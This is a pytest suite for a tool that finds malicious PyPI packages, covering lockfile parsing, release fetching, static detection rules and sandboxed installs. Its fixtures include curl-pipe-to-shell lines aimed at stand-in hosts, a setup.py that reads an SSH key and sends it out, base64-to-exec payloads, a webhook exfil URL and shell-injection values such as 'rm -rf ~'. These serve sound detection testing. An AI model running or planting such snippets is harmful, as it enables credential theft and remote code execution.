"""PyPI support: reading Python lockfiles, fetching and unpacking releases,
scanning Python code, and the CLI flow, including the cases that must NOT
be flagged (ordinary build scripts are full of subprocess calls)."""
from __future__ import annotations

import hashlib
import io
import json
import tarfile
import zipfile
from pathlib import Path

import httpx
import pytest
from click.testing import CliRunner

from malwhunter import cli
from malwhunter.dossier.model import Dossier, Ecosystem, Severity
from malwhunter.intake import pypi_registry
from malwhunter.intake.pypi_manifest import normalize_name, resolve_python_dependencies
from malwhunter.intake.pypi_registry import (
    check_pypi_presence,
    fetch_package,
    fetch_pypi_reputation,
)
from malwhunter.intake.registry import PackageFetchError
from malwhunter.recon.python_scanner import run_python_recon

# ---------- manifests ----------


def names(refs):
    return [(r.name, r.version) for r in refs]


def test_normalize_name_follows_pep_503():
    assert normalize_name("Flask_SQLAlchemy.Ext") == "flask-sqlalchemy-ext"


def test_uv_lock_keeps_registry_packages_and_drops_everything_else(tmp_path):
    (tmp_path / "uv.lock").write_text(
        'version = 1\n'
        '[[package]]\nname = "Requests"\nversion = "2.31.0"\nsource = { registry = "https://pypi.org/simple" }\n'
        '[[package]]\nname = "myapp"\nversion = "0.1.0"\nsource = { editable = "." }\n'
        '[[package]]\nname = "fromgit"\nversion = "1.0"\nsource = { git = "https://github.com/x/y" }\n'
        '[[package]]\nname = "vendored"\nversion = "1.0"\nsource = { directory = "libs/v" }\n'
    )
    assert names(resolve_python_dependencies(tmp_path)) == [("requests", "2.31.0")]


def test_poetry_lock_skips_git_and_path_dependencies(tmp_path):
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "six"\nversion = "1.16.0"\n'
        '[[package]]\nname = "gitdep"\nversion = "1.0"\n[package.source]\ntype = "git"\nurl = "https://x"\n'
    )
    assert names(resolve_python_dependencies(tmp_path)) == [("six", "1.16.0")]


def test_pipfile_lock_reads_default_and_develop_and_skips_unversioned(tmp_path):
    (tmp_path / "Pipfile.lock").write_text(
        json.dumps({"default": {"Flask": {"version": "==3.0.3"}, "vcs": {"git": "https://x"}},
                    "develop": {"pytest": {"version": "==8.3.3"}}})
    )
    assert names(resolve_python_dependencies(tmp_path)) == [("flask", "3.0.3"), ("pytest", "8.3.3")]


def test_lockfile_wins_over_requirements(tmp_path):
    (tmp_path / "uv.lock").write_text('[[package]]\nname = "a"\nversion = "1.0"\nsource = { registry = "x" }\n')
    (tmp_path / "requirements.txt").write_text("b==2.0\n")
    assert names(resolve_python_dependencies(tmp_path)) == [("a", "1.0")]


def test_requirements_pins_extras_markers_hashes_and_includes(tmp_path):
    (tmp_path / "base.txt").write_text("idna==3.7\n")
    (tmp_path / "requirements.txt").write_text(
        "# comment\n-r base.txt\nrequests[security]==2.31.0 ; python_version > '3.8'\n"
        "urllib3==2.2.3 \\\n    --hash=sha256:abc\n"
        "flask>=2.0\nnopin\n-e .\ngit+https://github.com/x/y.git\n./local\n--index-url https://x\n"
    )
    got = dict(names(resolve_python_dependencies(tmp_path)))
    assert got["requests"] == "2.31.0" and got["urllib3"] == "2.2.3" and got["idna"] == "3.7"
    assert got["flask"] == ">=2.0" and got["nopin"] == "unpinned"  # surfaced, so they end up UNSCANNED
    assert len(got) == 5


def test_requirements_include_cannot_escape_the_project(tmp_path):
    (tmp_path / "outside.txt").write_text("evil==1.0\n")
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "requirements.txt").write_text("-r ../outside.txt\n")
    assert resolve_python_dependencies(proj) == []


def test_scan_resolves_both_ecosystems(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"name": "p", "dependencies": {"left-pad": "1.3.0"}}))
    (tmp_path / "package-lock.json").write_text(
        json.dumps({"lockfileVersion": 3, "packages": {"": {}, "node_modules/left-pad": {"version": "1.3.0"}}})
    )
    (tmp_path / "requirements.txt").write_text("six==1.16.0\n")
    deps = cli._resolve_all(tmp_path)
    assert {(d.ecosystem, d.name, d.version) for d in deps} == {("npm", "left-pad", "1.3.0"), ("pypi", "six", "1.16.0")}


def test_directory_with_no_manifest_keeps_the_original_npm_error(tmp_path):
    with pytest.raises(FileNotFoundError):
        cli._resolve_all(tmp_path)


# ---------- registry ----------


def _sdist_bytes() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, data in {"demo-1.0/setup.py": b"from setuptools import setup\nsetup()\n", "demo-1.0/demo/__init__.py": b""}.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _wheel_bytes(extra: dict[str, bytes] | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("demo/__init__.py", "")
        zf.writestr("demo-1.0.dist-info/METADATA", "Name: demo")
        for name, data in (extra or {}).items():
            zf.writestr(name, data)
    return buf.getvalue()


def _release(sdist: bytes | None, wheel: bytes | None, *, bad_digest: bool = False, yanked: bool = False) -> tuple[dict, dict]:
    files, blobs = [], {}
    for kind, name, data in (("sdist", "demo-1.0.tar.gz", sdist), ("bdist_wheel", "demo-1.0-py3-none-any.whl", wheel)):
        if data is None:
            continue
        digest = "0" * 64 if bad_digest else hashlib.sha256(data).hexdigest()
        files.append({"packagetype": kind, "filename": name, "url": f"https://files.test/{name}", "digests": {"sha256": digest}, "yanked": yanked})
        blobs[f"/{name}"] = data
    return {"urls": files}, blobs


def _client(meta: dict, blobs: dict) -> httpx.Client:
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "files.test":
            return httpx.Response(200, content=blobs[request.url.path])
        return httpx.Response(200, json=meta)

    return httpx.Client(transport=httpx.MockTransport(handler))


def test_fetch_package_unpacks_sdist_and_wheel(tmp_path):
    meta, blobs = _release(_sdist_bytes(), _wheel_bytes())
    pkg = fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs))
    assert (pkg.sdist_dir / "setup.py").exists() and (pkg.wheel_dir / "demo" / "__init__.py").exists()
    assert pkg.wheel_file.name.endswith(".whl") and pkg.yanked is False


def test_fetch_package_accepts_a_wheel_only_release(tmp_path):
    meta, blobs = _release(None, _wheel_bytes())
    pkg = fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs))
    assert pkg.sdist_dir is None and pkg.wheel_dir is not None


def test_download_that_does_not_match_the_published_digest_is_refused(tmp_path):
    meta, blobs = _release(_sdist_bytes(), None, bad_digest=True)
    with pytest.raises(PackageFetchError, match="SHA-256"):
        fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs))


def test_release_with_no_files_is_an_error(tmp_path):
    with pytest.raises(PackageFetchError, match="no downloadable files"):
        fetch_package("demo", "1.0", tmp_path, client=_client({"urls": []}, {}))


def test_oversized_download_is_refused(tmp_path, monkeypatch):
    monkeypatch.setattr(pypi_registry, "MAX_TARBALL_BYTES", 50)
    meta, blobs = _release(_sdist_bytes(), None)
    with pytest.raises(PackageFetchError, match="larger than"):
        fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs))


def test_wheel_member_that_escapes_the_directory_is_refused(tmp_path):
    meta, blobs = _release(None, _wheel_bytes({"../../escape.py": b"x"}))
    with pytest.raises(PackageFetchError, match="escapes"):
        fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs))
    assert not (tmp_path / "escape.py").exists()


def test_yanked_releases_are_reported(tmp_path):
    meta, blobs = _release(_sdist_bytes(), None, yanked=True)
    assert fetch_package("demo", "1.0", tmp_path, client=_client(meta, blobs)).yanked is True


def test_http_errors_carry_their_status(tmp_path):
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(404)))
    with pytest.raises(PackageFetchError) as err:
        fetch_package("nope", "1.0", tmp_path, client=client)
    assert err.value.status_code == 404


def test_presence_distinguishes_a_missing_project_from_a_missing_release():
    def handler(request: httpx.Request) -> httpx.Response:
        if "ghost" in request.url.path:
            return httpx.Response(404)
        return httpx.Response(200, json={"releases": {"1.0": []}})

    client = httpx.Client(transport=httpx.MockTransport(handler))
    assert check_pypi_presence("ghost", "1.0", client=client).name_exists is False
    got = check_pypi_presence("real", "2.0", client=client)
    assert got.name_exists and not got.version_exists
    assert check_pypi_presence("real", "1.0", client=client).version_exists


def test_presence_is_unknown_not_missing_when_pypi_errors():
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(503)))
    assert check_pypi_presence("x", "1.0", client=client) is None


def test_reputation_fields_are_none_on_failure_so_detonation_is_not_skipped():
    client = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(500)))
    rep = fetch_pypi_reputation("x", "1.0", client=client)
    assert rep.age_days is None and rep.downloads_last_month is None


# ---------- the scanner: things that must be caught ----------


def scan(tmp_path: Path, files: dict[str, str], *, label: str = "sdist"):
    for rel, text in files.items():
        path = tmp_path / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return run_python_recon([(tmp_path, label)], "demo")


def cats(signals, *, minimum=Severity.MEDIUM):
    order = [Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL]
    return sorted({s.category for s in signals if order.index(s.severity) >= order.index(minimum)})


@pytest.mark.parametrize(
    "code",
    [
        "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))",
        "import zlib, base64\nexec(zlib.decompress(base64.b64decode(blob)))",
        "from base64 import b64decode as d\nexec(d(blob))",
        "import marshal\nexec(marshal.loads(data))",
        "exec(bytes.fromhex('7072696e74283129').decode())",
        "exec('abc'.decode('hex'))",
        "eval(compile(__import__('base64').b64decode(x), 'f', 'exec'))" if False else "import base64\neval(base64.b64decode(x))",
    ],
)
def test_decoding_a_payload_into_exec_is_high_in_any_file(tmp_path, code):
    assert "obfuscated-exec" in cats(scan(tmp_path, {"pkg/helpers.py": code}), minimum=Severity.HIGH)


def test_module_name_built_from_pieces_is_flagged(tmp_path):
    assert "obfuscated-module-load" in cats(scan(tmp_path, {"pkg/x.py": "m = __import__('o' + 's')"}))
    assert "obfuscated-module-load" in cats(scan(tmp_path, {"pkg/y.py": "import importlib\nimportlib.import_module(''.join(['sub','process']))"}))


def test_curl_pipe_sh_is_high_anywhere(tmp_path):
    out = scan(tmp_path, {"pkg/x.py": "import os\nos.system('curl -s http://x.test/p.sh | sh')"})
    assert "command-exec-shell-pipe" in cats(out, minimum=Severity.HIGH)


def test_setup_py_with_computed_shell_command_is_high(tmp_path):
    out = scan(tmp_path, {"setup.py": "import os\nos.system('pip install ' + os.environ['X'])\n"})
    assert "command-exec-computed-arg" in cats(out, minimum=Severity.HIGH)


def test_setup_py_running_a_decoded_command_is_high(tmp_path):
    out = scan(tmp_path, {"setup.py": "import subprocess, base64\nsubprocess.Popen(base64.b64decode(P), shell=True)\n"})
    assert "obfuscated-exec" in cats(out, minimum=Severity.HIGH)


def test_setup_py_handing_a_computed_script_to_a_shell_or_interpreter_is_high(tmp_path):
    out = scan(tmp_path, {"setup.py": "import subprocess, sys\nsubprocess.run([sys.executable, '-c', build_payload()])\n"})
    assert "command-exec-computed-arg" in cats(out, minimum=Severity.HIGH)


def test_exec_of_a_computed_string_is_high_at_install_time_only(tmp_path):
    assert "exec-computed-arg" in cats(scan(tmp_path, {"setup.py": "exec(get_code())"}), minimum=Severity.HIGH)
    assert "exec-computed-arg" in cats(scan(tmp_path / "b", {"pkg/__init__.py": "exec(get_code())"}), minimum=Severity.HIGH)
    assert "exec-computed-arg" not in cats(scan(tmp_path / "c", {"pkg/engine.py": "exec(get_code())"}))


def test_credential_paths_and_network_in_setup_py(tmp_path):
    code = (
        "import os, urllib.request\n"
        "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "urllib.request.urlopen('http://x.test/?k=' + key)\n"
    )
    assert {"credential-file-access", "sensitive-data-network-cooccurrence"} <= set(cats(scan(tmp_path, {"setup.py": code}), minimum=Severity.HIGH))


def test_environment_dump_in_setup_py_is_high(tmp_path):
    out = scan(tmp_path, {"setup.py": "import os, json\nopen('/tmp/x', 'w').write(json.dumps(os.environ))\n"})
    assert "bulk-env-enumeration" in cats(out, minimum=Severity.HIGH)
    out = scan(tmp_path / "b", {"setup.py": "import os\nfor k in os.environ:\n    print(k)\n"})
    assert "bulk-env-enumeration" in cats(out, minimum=Severity.HIGH)


def test_pth_file_that_runs_something_other_than_a_path_is_high(tmp_path):
    out = scan(tmp_path, {"evil.pth": "import os; os.system('curl x | sh')\n"}, label="wheel")
    assert "pth-startup-code" in cats(out, minimum=Severity.HIGH)
    out = scan(tmp_path / "b", {"b64.pth": "import base64; exec(base64.b64decode('YQ=='))\n"}, label="wheel")
    assert "pth-startup-code" in cats(out, minimum=Severity.HIGH)


def test_known_exfil_channel_in_package_code(tmp_path):
    out = scan(tmp_path, {"pkg/x.py": "URL = 'https://discord.com/api/webhooks/123/abc'\n"})
    assert "known-exfil-channel" in cats(out, minimum=Severity.HIGH)


def test_sitecustomize_at_the_wheel_root_is_flagged_but_not_inside_a_package(tmp_path):
    assert "startup-hook-file" in cats(scan(tmp_path, {"sitecustomize.py": "x = 1\n"}, label="wheel"))
    assert "startup-hook-file" not in cats(scan(tmp_path / "b", {"pkg/sitecustomize.py": "x = 1\n"}, label="wheel"))
    assert "startup-hook-file" not in cats(scan(tmp_path / "c", {"sitecustomize.py": "x = 1\n"}, label="sdist"))


def test_overriding_the_install_command_is_medium_but_build_ext_is_only_context(tmp_path):
    hooked = "from setuptools import setup\nsetup(cmdclass={'install': Evil})\n"
    assert "custom-install-command" in cats(scan(tmp_path, {"setup.py": hooked}))
    benign = "from setuptools import setup\nsetup(cmdclass={'build_ext': B, 'test': T})\n"
    assert "custom-install-command" not in cats(scan(tmp_path / "b", {"setup.py": benign}))


def test_code_in_an_in_tree_build_backend_gets_the_strict_rules(tmp_path):
    files = {
        "pyproject.toml": '[build-system]\nrequires=[]\nbuild-backend="backend"\nbackend-path=["_build"]\n',
        "_build/backend.py": "import os\nos.system('curl http://x.test/p | sh')\nexec(get())\n",
    }
    out = scan(tmp_path, files)
    assert {"command-exec-shell-pipe", "exec-computed-arg"} <= set(cats(out, minimum=Severity.HIGH))
    assert "custom-build-backend" in {s.category for s in out}  # recorded, as context


def test_wheel_with_import_time_code_missing_from_the_sdist_is_medium(tmp_path):
    sdist, wheel = tmp_path / "s", tmp_path / "w"
    (sdist / "pkg").mkdir(parents=True)
    (sdist / "pkg" / "__init__.py").write_text("")
    (wheel / "pkg").mkdir(parents=True)
    (wheel / "pkg" / "__init__.py").write_text("")
    (wheel / "other").mkdir()
    (wheel / "other" / "__init__.py").write_text("")
    out = run_python_recon([(sdist, "sdist"), (wheel, "wheel")], "demo")
    mismatch = [s for s in out if s.category == "wheel-sdist-mismatch"]
    assert mismatch and mismatch[0].severity == Severity.MEDIUM and "other/__init__.py" in mismatch[0].evidence[0].excerpt


def test_python_2_source_still_gets_the_pattern_rules(tmp_path):
    out = scan(tmp_path, {"pkg/old.py": "print 'hi'\nexec base64.b64decode(x)\nexec(base64.b64decode(y))\n"})
    assert "obfuscated-exec" in cats(out, minimum=Severity.HIGH)


# ---------- the scanner: things that must NOT be flagged ----------


@pytest.mark.parametrize(
    "files",
    [
        # reading the version out of a file that ships in the package
        {"setup.py": "about = {}\nwith open('pkg/__version__.py') as f:\n    exec(f.read(), about)\nsetup(version=about['v'])\n"},
        {"setup.py": "exec(compile(open('v.py').read(), 'v.py', 'exec'))\n"},
        # ordinary build tooling
        {"setup.py": "import subprocess\nv = subprocess.check_output(['git', 'describe', '--tags'], cwd=root)\n"},
        {"setup.py": "import subprocess, sys\nsubprocess.call([sys.executable, 'setup.py', 'build_ext', '--inplace'])\n"},
        {"setup.py": "import subprocess\nsubprocess.Popen(cmd_variable)\n"},
        {"setup.py": "import os\nenv = dict(os.environ)\nenv['CC'] = 'gcc'\nrun(env=env)\n"},
        {"setup.py": "import os\nos.system('python -m build')\n"},
        # a library doing library things
        {"pkg/net.py": "import os, socket\nproxy = os.environ.get('HTTP_PROXY')\ns = socket.create_connection((h, 80))\n"},
        {"pkg/engine.py": "import subprocess\nsubprocess.run(cmd, shell=True)\nexec(src)\n"},
        {"pkg/__init__.py": "def run_script(code):\n    exec(code, {})\n"},  # never called while importing
        {"tests/conftest.py": "import os\nexec(os.environ['X'])\nURL = 'https://discord.com/api/webhooks/1/a'\n"},
        {"pkg/__init__.py": "import os\n__version__ = os.environ.get('V', '1.0')\n"},
        {"pkg/tables.py": "ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n"},
        {"pkg/ok.py": "m = __import__('json')\nimportlib = __import__('importlib')\n"},
    ],
)
def test_ordinary_code_is_not_flagged(tmp_path, files):
    assert cats(scan(tmp_path, files)) == []


def test_clean_pth_files_are_not_flagged(tmp_path):
    for text in ("/some/path\n", "import coverage; coverage.process_startup()\n",
                 "import os; var = 'X'; enabled = os.environ.get(var) == 'local'; enabled and __import__('_distutils_hack').add_shim();\n"):
        assert cats(scan(tmp_path / str(hash(text)), {"x.pth": text}, label="wheel")) == [], text


def test_oversized_python_file_is_a_coverage_note_not_a_crash(tmp_path, monkeypatch):
    from malwhunter.recon import python_scanner

    monkeypatch.setattr(python_scanner, "_MAX_FILE_SIZE", 10)
    out = scan(tmp_path, {"pkg/big.py": "x = 1\n" * 100})
    gaps = [s for s in out if s.category == "scan-coverage-gap"]
    assert gaps and gaps[0].severity == Severity.LOW


def test_pyproject_parse_errors_do_not_crash(tmp_path):
    assert cats(scan(tmp_path, {"pyproject.toml": "this is [[ not toml"})) == []


def test_python_typosquat_uses_the_pypi_list():
    from malwhunter.recon.scanner import scan_typosquat

    assert scan_typosquat("reqeusts", "pypi")[0].category == "typosquat-candidate"
    assert scan_typosquat("requests", "pypi") == []
    assert scan_typosquat("numpyy", "pypi")
    assert scan_typosquat("numpyy", "npm") == []  # a PyPI-only name is not judged against the npm list


# ---------- CLI flow ----------


def _fake_release(monkeypatch, tmp_path, files: dict[str, str], *, wheel: dict[str, str] | None = None, yanked=False):
    root = tmp_path / "rel"
    sdist = root / "sdist" / "demo-1.0"
    for rel, text in files.items():
        (sdist / rel).parent.mkdir(parents=True, exist_ok=True)
        (sdist / rel).write_text(text)
    wheel_dir = None
    if wheel is not None:
        wheel_dir = root / "wheel"
        for rel, text in wheel.items():
            (wheel_dir / rel).parent.mkdir(parents=True, exist_ok=True)
            (wheel_dir / rel).write_text(text)
    pkg = pypi_registry.PyPIPackage(root=root, sdist_dir=sdist, wheel_dir=wheel_dir, wheel_file=None, yanked=yanked)
    monkeypatch.setattr(cli, "fetch_package", lambda *a, **k: pkg)
    monkeypatch.setattr(cli, "fetch_pypi_reputation", lambda *a, **k: None)


def _analyze(tmp_path, mode="never", name="Demo_Pkg", version="1.0"):
    return cli._analyze_package(
        name, version, tmp_path, detonate_mode=mode, age_threshold_days=30, downloads_threshold=1000,
        analyst=None, ecosystem="pypi",
    )


def test_pypi_package_is_analyzed_and_normalized(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "import os\nos.system('curl http://x.test | sh')\n"})
    d = _analyze(tmp_path)
    assert d.ecosystem == Ecosystem.PYPI and d.package == "demo-pkg" and d.dossier_key == "pypi:demo-pkg@1.0"
    assert d.to_dict()["verdict"] == "suspicious" and d.to_dict()["ecosystem"] == "pypi"
    assert "setup.py:2" in next(iter(d.code_context))


def test_clean_pypi_package_is_clean(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "from setuptools import setup\nsetup(name='demo')\n"})
    assert _analyze(tmp_path).to_dict()["verdict"] == "clean"


@pytest.mark.parametrize("version", [">=1.0", "unpinned", "~=2.1", "latest", ""])
def test_unpinned_python_requirements_are_unscanned_without_fetching(tmp_path, monkeypatch, version):
    monkeypatch.setattr(cli, "fetch_package", lambda *a, **k: pytest.fail("must not fetch"))
    d = _analyze(tmp_path, version=version)
    assert d.to_dict()["verdict"] == "unscanned" and "not an exact version" in d.scan_error


@pytest.mark.parametrize("version", ["1.0", "2024.1.2", "1.0rc1", "1.0.post2", "2.0.dev3", "1.0+local1", "3"])
def test_pep_440_versions_are_fetched(tmp_path, monkeypatch, version):
    seen = []
    monkeypatch.setattr(cli, "fetch_package", lambda n, v, *a, **k: seen.append(v) or (_ for _ in ()).throw(PackageFetchError("stop")))
    _analyze(tmp_path, version=version)
    assert seen == [version]


def test_unclaimed_python_name_is_flagged_and_unscanned(tmp_path, monkeypatch):
    def not_found(*a, **k):
        raise PackageFetchError("404", status_code=404)

    from malwhunter.intake.registry import RegistryPresence

    monkeypatch.setattr(cli, "fetch_package", not_found)
    monkeypatch.setattr(cli, "check_pypi_presence", lambda n, v: RegistryPresence("u", False, False, False))
    d = _analyze(tmp_path, name="pandas-ai-helperz")
    assert d.to_dict()["verdict"] == "unscanned" and any(s.category == "unclaimed-package-name" for s in d.signals)


def test_missing_release_of_a_real_project_is_unscanned_with_a_reason(tmp_path, monkeypatch):
    def not_found(*a, **k):
        raise PackageFetchError("404", status_code=404)

    from malwhunter.intake.registry import RegistryPresence

    monkeypatch.setattr(cli, "fetch_package", not_found)
    monkeypatch.setattr(cli, "check_pypi_presence", lambda n, v: RegistryPresence("u", True, False, False))
    assert "is not on PyPI" in _analyze(tmp_path).scan_error


def test_yanked_release_is_recorded_as_context_only(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "x = 1\n"}, yanked=True)
    d = _analyze(tmp_path)
    assert [s.category for s in d.signals] == ["yanked-release"] and d.to_dict()["verdict"] == "clean"


def test_pypi_detonation_runs_pip_in_the_sandbox_and_stores_the_summary(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "x = 1\n"})
    calls = []

    def fake(name, version, install_dir, install_target, *, summary=None, **kw):
        calls.append((name, version, install_dir.name, install_target))
        summary.update({"exit_code": 0, "scripts_run": {"pip install": "pip install /pkg"}})
        return []

    monkeypatch.setattr("malwhunter.chamber.runner.detonate_pypi_package", fake)
    d = _analyze(tmp_path, mode="always")
    assert calls == [("demo-pkg", "1.0", "demo-1.0", "")] and d.detonated and d.detonation_summary["exit_code"] == 0


def test_pypi_detonation_unavailable_is_explained(tmp_path, monkeypatch):
    from malwhunter.chamber.runner import DetonationUnavailable

    _fake_release(monkeypatch, tmp_path, {"setup.py": "x = 1\n"})

    def unavailable(*a, **k):
        raise DetonationUnavailable("Docker daemon is not reachable")

    monkeypatch.setattr("malwhunter.chamber.runner.detonate_pypi_package", unavailable)
    d = _analyze(tmp_path, mode="always")
    assert not d.detonated and "unavailable: Docker daemon is not reachable" in d.detonation_decision_reason


def test_static_mode_never_detonates_a_python_package(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "x = 1\n"})
    monkeypatch.setattr("malwhunter.chamber.runner.detonate_pypi_package", lambda *a, **k: pytest.fail("no"))
    assert _analyze(tmp_path, mode="never").detonation_decision_reason == "detonation disabled (--no-detonate)"


def test_inspect_understands_the_pypi_prefix(tmp_path, monkeypatch):
    _fake_release(monkeypatch, tmp_path, {"setup.py": "x = 1\n"})
    for spec in ("pypi:Demo_Pkg==1.0", "pypi:Demo_Pkg@1.0"):
        result = CliRunner().invoke(cli.cli, ["inspect", spec, "--mode", "static", "--no-ai", "--format", "json"])
        assert result.exit_code == 0, result.output
        assert json.loads(result.stdout)["dossiers"][0]["ecosystem"] == "pypi"


def test_inspect_still_reads_scoped_npm_names(monkeypatch):
    seen = []
    monkeypatch.setattr(cli, "_analyze_safely", lambda n, v, w, **k: seen.append((n, v, k["ecosystem"])) or Dossier(package=n, version=v))
    CliRunner().invoke(cli.cli, ["inspect", "@scope/pkg@1.2.3", "--mode", "static", "--no-ai", "--format", "json"])
    CliRunner().invoke(cli.cli, ["inspect", "npm:left-pad@1.3.0", "--mode", "static", "--no-ai", "--format", "json"])
    assert seen == [("@scope/pkg", "1.2.3", "npm"), ("left-pad", "1.3.0", "npm")]


def test_cache_keeps_the_two_ecosystems_apart(tmp_path):
    from malwhunter.cache import DossierCache

    cache = DossierCache(tmp_path, mode="smart", ai=False, fingerprint="f")
    cache.put(Dossier(package="requests", version="1.0"))
    assert cache.get("requests", "1.0", "npm") is not None and cache.get("requests", "1.0", "pypi") is None
    cache.put(Dossier(package="requests", version="1.0", ecosystem=Ecosystem.PYPI))
    assert cache.get("requests", "1.0", "pypi").ecosystem == Ecosystem.PYPI


def test_ignore_rule_can_be_limited_to_one_ecosystem(tmp_path):
    from malwhunter.intake.ignore import IgnoreRule, apply_ignore_rules

    rule = IgnoreRule(package="requests", reason="reviewed", ecosystem="pypi")
    npm, py = Dossier(package="requests", version="1.0"), Dossier(package="requests", version="1.0", ecosystem=Ecosystem.PYPI)
    outcome = apply_ignore_rules([npm, py], [rule])
    assert list(outcome.matched) == ["pypi:requests@1.0"]


def test_agent_prompt_gives_safe_pypi_fetch_instructions(tmp_path):
    from malwhunter.report.agent_prompt import dossiers_to_agent_prompt

    d = Dossier(package="demo", version="1.0", ecosystem=Ecosystem.PYPI)
    out = dossiers_to_agent_prompt([d], "pypi:demo==1.0")
    assert "(PyPI)" in out and "https://pypi.org/pypi/demo/1.0/json" in out and "Do NOT 'pip install'" in out


# ---------- the sandbox command ----------


def test_python_install_commands_install_then_import():
    from malwhunter.chamber.runner import python_install_commands

    cmds = python_install_commands("demo-pkg", "/pkg")
    assert list(cmds) == ["pip install", "import"]
    assert "--no-deps" in cmds["pip install"] and "--user" in cmds["pip install"] and "/pkg" in cmds["pip install"]
    assert "top_level.txt" in cmds["import"] and "'demo-pkg'" in cmds["import"]


def test_hostile_package_name_cannot_inject_into_the_sandbox_shell():
    import shlex

    from malwhunter.chamber.runner import python_install_commands

    cmds = python_install_commands("x'; touch /pwned; '", "/pkg/a b; rm -rf ~")
    assert shlex.split(cmds["pip install"])[-1] == "/pkg/a b; rm -rf ~"
    assert len(shlex.split(cmds["import"])) == 3  # python, -c, <one script>


def test_python_sandbox_uses_its_own_image_user_and_pip_certificate():
    from malwhunter.chamber import runner

    cmd = runner._build_docker_command(
        Path("/s/pkg"), {"NPM_TOKEN": "c"}, "pip install /pkg", network="n", container_name="c",
        ca_path=Path("/s/ca.pem"), image=runner.PYTHON_IMAGE, user="sandbox",
    )
    assert runner.PYTHON_IMAGE in cmd and cmd[cmd.index("--user") + 1] == "sandbox"
    assert "PIP_CERT=/etc/malwhunter/ca.pem" in cmd
    assert runner.PYTHON_IMAGE.startswith("malwhunter-sandbox-py:")


def test_pypi_hosts_are_expected_destinations():
    from malwhunter.chamber.runner import ALLOWED_HOSTS

    assert {"pypi.org", "files.pythonhosted.org"} <= ALLOWED_HOSTS


def test_repeated_observations_are_reported_once():
    from malwhunter.chamber.runner import _Capture, _signals_from_capture
    from malwhunter.wiretap.proxy import CapturedConnect

    capture = _Capture(connects=[CapturedConnect("evil.test", 443)] * 3)
    sigs = _signals_from_capture("x", capture, {})
    assert len(sigs) == 3  # per-connect signals share an id...
    assert len({s.id for s in sigs}) == 1  # ...and the run collapses them to one
